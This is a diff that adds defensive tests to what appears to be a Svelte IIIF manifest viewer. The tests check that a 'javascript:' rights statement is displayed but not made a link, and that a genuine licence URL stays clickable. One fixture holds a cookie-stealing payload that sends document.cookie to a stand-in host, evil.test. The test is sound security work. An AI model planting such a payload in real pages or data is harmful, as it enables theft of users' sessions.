@@ -280,6 +280,34 @@ describe('what a selection pane is shown', () => {
 		);
 	});
 
+	it('refuses to make a javascript: rights statement clickable', async () => {
+		// Svelte does not sanitise `href`. A Manifest declaring `"rights": "javascript:…"` would
+		// otherwise produce a link that runs script the moment a scholar clicks it to read the licence —
+		// which is the most natural thing in the world to click. So `rightsLink` is a separate field
+		// from `rights`: the string is still shown, and it is not a link.
+		const resource = await readRemoteIiifResource(
+			'https://library.example.test/iiif/atlas/manifest.json',
+			{
+				fetch: async () =>
+					json({ ...manifest(1), rights: 'javascript:fetch("https://evil.test/"+document.cookie)' })
+			}
+		);
+		const described = describeRemoteResource(resource.parsed, resource.document);
+
+		expect(described.rights).toBe('javascript:fetch("https://evil.test/"+document.cookie)');
+		expect(described.rightsLink).toBe('');
+	});
+
+	it('keeps a real rights statement clickable', async () => {
+		const resource = await readRemoteIiifResource(
+			'https://library.example.test/iiif/atlas/manifest.json',
+			{ fetch: async () => json(manifest(1)) }
+		);
+		const described = describeRemoteResource(resource.parsed, resource.document);
+
+		expect(described.rightsLink).toBe('http://creativecommons.org/licenses/by/4.0/');
+	});
+
 	it('lists each canvas with the image service URI that will cross the boundary', async () => {
 		const resource = await readRemoteIiifResource(
 			'https://library.example.test/iiif/atlas/manifest.json',
